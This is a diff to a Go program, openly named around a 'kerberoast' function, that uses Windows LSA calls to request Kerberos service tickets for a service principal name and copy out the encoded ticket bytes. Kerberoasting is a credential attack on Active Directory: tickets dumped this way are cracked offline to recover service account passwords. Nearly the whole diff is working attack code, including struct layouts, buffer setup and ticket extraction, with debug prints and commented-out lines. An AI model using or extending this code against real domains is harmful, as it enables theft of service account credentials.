@@ -26,7 +26,7 @@ import (
 //sys LsaConnectUntrusted(lsaHandle *uintptr) (ret uint32) = Secur32.LsaConnectUntrusted
 //sys LsaDeregisterLogonProcess(lsaHandle uintptr) (ret uint32) = Secur32.LsaDeregisterLogonProcess
 //sys LsaLookupAuthenticationPackage(lsaHandle uintptr, packageName *LSA_STRING, authenticationPackage *uint32) (ret uint32) = Secur32.LsaLookupAuthenticationPackage
-//sys LsaCallAuthenticationPackage(lsaHandle uintptr, authenticationPackage uint32, protocolSubmitBuffer uintptr, submitBufferLength uint32, protocolReturnBuffer uintptr, returnBufferLength *uint32, pNTSTATUS *uint32) (ret uint32) = Secur32.LsaCallAuthenticationPackage
+//sys LsaCallAuthenticationPackage(lsaHandle uintptr, authenticationPackage uint32, protocolSubmitBuffer uintptr, submitBufferLength uint32, protocolReturnBuffer *uintptr, returnBufferLength *uint32, pNTSTATUS *uint32) (ret uint32) = Secur32.LsaCallAuthenticationPackage
 
 //sys GetComputerNameExA(nametype uint32, buf unsafe.Pointer, n *uint32) (err error) = Kernel32.GetComputerNameExA
 
@@ -49,6 +49,7 @@ type (
 	PWSTR    *uint16
 	SHORT    int16
 	PCHAR    *uint8
+	PUCHAR   *uint8
 	CHAR     uint8
 	NTSTATUS uint32
 )
@@ -64,18 +65,19 @@ const (
 )
 
 const (
-	STATUS_SUCCESS                    uint32 = uint32(windows.STATUS_SUCCESS)
-	STATUS_ACCESS_DENIED              uint32 = uint32(windows.STATUS_ACCESS_DENIED)
-	DEFAULT_AUTH_PKG_ID               uint32 = math.MaxUint32
-	MICROSOFT_KERBEROS_NAME_A         string = "Kerberos"
-	KERB_RETRIEVE_TICKET_DEFAULT      uint32 = 0x0
-	KERB_RETRIEVE_TICKET_AS_KERB_CRED uint32 = 0x8
-	KerbRetrieveEncodedTicketMessage  uint32 = 8
-	KerbForwardable                   uint32 = 1073741824
-	KerbForwarded                     uint32 = 536870912
-	KerbRenewable                     uint32 = 8388608
-	KerbPre_authent                   uint32 = 2097152
-	ticketFlags                       uint32 = KerbForwardable | KerbForwarded | KerbRenewable | KerbPre_authent
+	STATUS_SUCCESS                      uint32 = uint32(windows.STATUS_SUCCESS)
+	STATUS_ACCESS_DENIED                uint32 = uint32(windows.STATUS_ACCESS_DENIED)
+	DEFAULT_AUTH_PKG_ID                 uint32 = math.MaxUint32
+	MICROSOFT_KERBEROS_NAME_A           string = "Kerberos"
+	KERB_RETRIEVE_TICKET_DEFAULT        uint32 = 0x0
+	KERB_RETRIEVE_TICKET_DONT_USE_CACHE uint32 = 0x1
+	KERB_RETRIEVE_TICKET_AS_KERB_CRED   uint32 = 0x8
+	KerbRetrieveEncodedTicketMessage    uint32 = 8
+	KerbForwardable                     uint32 = 1073741824
+	KerbForwarded                       uint32 = 536870912
+	KerbRenewable                       uint32 = 8388608
+	KerbPre_authent                     uint32 = 2097152
+	ticketFlags                         uint32 = KerbForwardable | KerbForwarded | KerbRenewable | KerbPre_authent
 )
 
 type User struct {
@@ -85,8 +87,8 @@ type User struct {
 }
 
 type LSA_STRING struct {
-	length        *int16
-	maximumLength *int16
+	length        int16
+	maximumLength int16
 	buffer        *byte
 }
 
@@ -99,10 +101,56 @@ type KERB_RETRIEVE_TKT_REQUEST struct {
 	encryptionType    int32
 	credentialsHandle SecHandle
 }
+type KERB_RETRIEVE_TKT_RESPONSE struct {
+	ticket KERB_EXTERNAL_TICKET
+}
+
+type KERB_EXTERNAL_TICKET struct {
+	serviceName         uintptr
+	targetName          uintptr
+	clientName          uintptr
+	domainName          windows.NTUnicodeString
+	targetDomainName    windows.NTUnicodeString
+	altTargetDomainName windows.NTUnicodeString
+	sessionKey          KERB_CRYPTO_KEY
+	ticketFlags         uint32
+	flags               uint32
+	keyExpirationTime   int64
+	dtartTime           int64
+	rndTime             int64
+	renewUntil          int64
+	timeSkew            int64
+	encodedTicketSize   uint32
+	encodedTicket       *uint32
+}
+type KERB_EXTERNAL_NAME struct {
+	nameType  int16
+	nameCount uint16
+	names     []windows.NTUnicodeString
+}
+
+type KERB_CRYPTO_KEY struct {
+	keyType int32
+	length  uint32
+	value   *uint8
+}
 
 type SecHandle struct {
-	dwLower uint32
-	dwUpper uint32
+	dwLower uintptr
+	dwUpper uintptr
+}
+
+func kerbExternalNameFromPtr(ptr uintptr) KERB_EXTERNAL_NAME {
+	ret := KERB_EXTERNAL_NAME{}
+	ret.nameType = *(*int16)(unsafe.Add(unsafe.Pointer(ptr), 0))
+	ret.nameCount = *(*uint16)(unsafe.Add(unsafe.Pointer(ptr), 2))
+	unicodeStringsSize := int(unsafe.Sizeof(windows.NTUnicodeString{}))
+	for i := 0; i < int(ret.nameCount); i++ {
+		offset := 4 + unicodeStringsSize*i
+		name := *(*windows.NTUnicodeString)(unsafe.Add(unsafe.Pointer(ptr), offset))
+		ret.names = append(ret.names, name)
+	}
+	return ret
 }
 
 //Max 1000byte /without error handling
@@ -127,30 +175,47 @@ func getDomainSPNTicket() {
 	if LsaConnectUntrusted(&hLsa) != STATUS_SUCCESS {
 		panic("KerberosTicketsManger::InitializeConnection: LsaConnectUntrusted failed")
 	}
+
 	lsaStrAuthPkgLangth := int16(len(MICROSOFT_KERBEROS_NAME_A))
 	lsaStrAuthPkgMaxLangth := int16(len(MICROSOFT_KERBEROS_NAME_A))
+	// lsaStrAuthPkgBuffer := make([]byte, lsaStrAuthPkgLangth)
+	// copy(lsaStrAuthPkgBuffer, MICROSOFT_KERBEROS_NAME_A)
 	lsaStrAuthPkgBuffer, err := windows.BytePtrFromString(MICROSOFT_KERBEROS_NAME_A)
 	if err != nil {
 		panic("BytePtrFromString Error")
 	}
 	//ToDo: hLsa defer and release
-	lsaStrAuthPkg := LSA_STRING{length: &lsaStrAuthPkgLangth, maximumLength: &lsaStrAuthPkgMaxLangth, buffer: lsaStrAuthPkgBuffer}
+	lsaStrAuthPkg := LSA_STRING{}
+	lsaStrAuthPkg.length = lsaStrAuthPkgLangth
+	lsaStrAuthPkg.maximumLength = lsaStrAuthPkgMaxLangth
+	lsaStrAuthPkg.buffer = lsaStrAuthPkgBuffer
 	authPkgId := DEFAULT_AUTH_PKG_ID
-
 	ticketsStatus := LsaLookupAuthenticationPackage(hLsa, &lsaStrAuthPkg, &authPkgId)
 	if ticketsStatus != STATUS_SUCCESS {
+		fmt.Println(ticketsStatus)
 		panic("KerberosTicketsManger::InitializeConnection: LsaLookupAuthenticationPackage failed")
 	}
 	luid := windows.LUID{LowPart: 0, HighPart: 0}
 	hSec := SecHandle{dwLower: 0, dwUpper: 0}
-	target := windows.NTUnicodeString{}
-	kerbRetrieveTktRequest := KERB_RETRIEVE_TKT_REQUEST{}
+
+	krbTmp := make([]byte, int(unsafe.Sizeof(KERB_RETRIEVE_TKT_RESPONSE{}))+((len(spn))*2))
+	fmt.Printf("krbTmpLength: %d\n", int(unsafe.Sizeof(KERB_RETRIEVE_TKT_RESPONSE{}))+((len(spn))*2))
+	siz := int(unsafe.Sizeof(KERB_RETRIEVE_TKT_RESPONSE{})) + ((len(spn)) * 2)
+	kerbRetrieveTktRequest := (*KERB_RETRIEVE_TKT_REQUEST)(unsafe.Pointer(&krbTmp[0]))
+	// KERB_RETRIEVE_TKT_REQUEST{}
 	// buffer := make([]uint16, length)
-	buffer := windows.StringToUTF16(spn)
-	length := uint16(unsafe.Sizeof(buffer))
-	target.Length = length
-	target.MaximumLength = length
-	target.Buffer = &buffer[0]
+	target := windows.NTUnicodeString{}
+	buffer := windows.StringToUTF16Ptr(spn)
+	// length := uint16((len(spn)+1)*2 - 2)
+	target.Length = uint16((len(spn)+1)*2 - 2)
+	target.MaximumLength = uint16((len(spn)) * 2)
+	target.Buffer = (*uint16)(unsafe.Add((unsafe.Pointer(&krbTmp[0])), int(unsafe.Sizeof(KERB_RETRIEVE_TKT_REQUEST{}))))
+	// buf := (*uint16)(unsafe.Add((unsafe.Pointer(&krbTmp[0])), int(unsafe.Sizeof(KERB_RETRIEVE_TKT_REQUEST{}))))
+	for i := 0; i < (int(target.MaximumLength) / 2); i++ {
+		tmp := *(*uint16)(unsafe.Add((unsafe.Pointer(buffer)), i*2))
+		*(*uint16)(unsafe.Add((unsafe.Pointer(&krbTmp[0])), int(unsafe.Sizeof(KERB_RETRIEVE_TKT_REQUEST{}))+(i*2))) = tmp
+	}
+	// fmt.Printf("utf16length: %d  length: %d\n", target.Length, len(spn))
 
 	kerbRetrieveTktRequest.messageType = KerbRetrieveEncodedTicketMessage
 	kerbRetrieveTktRequest.logonId = luid
@@ -159,13 +224,39 @@ func getDomainSPNTicket() {
 	kerbRetrieveTktRequest.cacheOptions = KERB_RETRIEVE_TICKET_DEFAULT
 	kerbRetrieveTktRequest.encryptionType = 0
 	kerbRetrieveTktRequest.credentialsHandle = hSec
-	protocolSubmitBuffer := uintptr(unsafe.Pointer(&kerbRetrieveTktRequest))
-	submitBufferLength := uint32(unsafe.Sizeof(kerbRetrieveTktRequest))
+	protocolSubmitBuffer := uintptr(unsafe.Pointer(kerbRetrieveTktRequest))
+	submitBufferLength := uint32(siz)
+	fmt.Printf("submitBufferLength: %d\n", submitBufferLength)
+	// protocolReturnBufferBase := KERB_RETRIEVE_TKT_RESPONSE{}
+	// protocolReturnBuffer := uintptr(unsafe.Pointer(&protocolReturnBufferBase))
 	var protocolReturnBuffer uintptr
 	responseLen := uint32(math.MaxUint32)
 	protocolStatus := STATUS_ACCESS_DENIED
-	ticketsStatus = LsaCallAuthenticationPackage(hLsa, authPkgId, protocolSubmitBuffer, submitBufferLength, protocolReturnBuffer, &responseLen, &protocolStatus)
+	ticketsStatus = LsaCallAuthenticationPackage(hLsa, authPkgId, protocolSubmitBuffer, submitBufferLength, &protocolReturnBuffer, &responseLen, &protocolStatus)
 
+	if ticketsStatus != STATUS_SUCCESS {
+		fmt.Println(ticketsStatus)
+		panic("KerberosTicketsManger::RequestTicketFromSystem: LsaCallAuthenticationPackage failed")
+	}
+	if protocolStatus != STATUS_SUCCESS {
+		fmt.Println(protocolStatus)
+		panic("KerberosTicketsManger::RequestTicketFromSystem: ProtocolStatus failed")
+	}
+	fmt.Println(responseLen)
+	fmt.Println(protocolReturnBuffer)
+	encodedTicket := []byte{}
+	protocolReturnBufferRaw := (*KERB_RETRIEVE_TKT_RESPONSE)(unsafe.Pointer(protocolReturnBuffer))
+	fmt.Println(protocolReturnBufferRaw)
+
+	fmt.Println(&protocolReturnBufferRaw)
+	for i := 0; i < int(protocolReturnBufferRaw.ticket.encodedTicketSize); i++ {
+		offset := i
+		tmp := *(*byte)(unsafe.Add(unsafe.Pointer(protocolReturnBufferRaw.ticket.encodedTicket), offset))
+		// fmt.Println(tmp)
+		encodedTicket = append(encodedTicket, tmp)
+	}
+
+	fmt.Println(encodedTicket)
 }
 
 func kerberoast() {
@@ -227,7 +318,10 @@ func kerberoast() {
 }
 
 func main() {
+	// hSec := SecHandle{dwLower: 0, dwUpper: 0}
+	// fmt.Println(unsafe.Sizeof(hSec))
 	kerberoast()
+	getDomainSPNTicket()
 	// usage := `Usage: usage`
 	// if len(os.Args) < 2 {
 	// 	fmt.Println(usage)
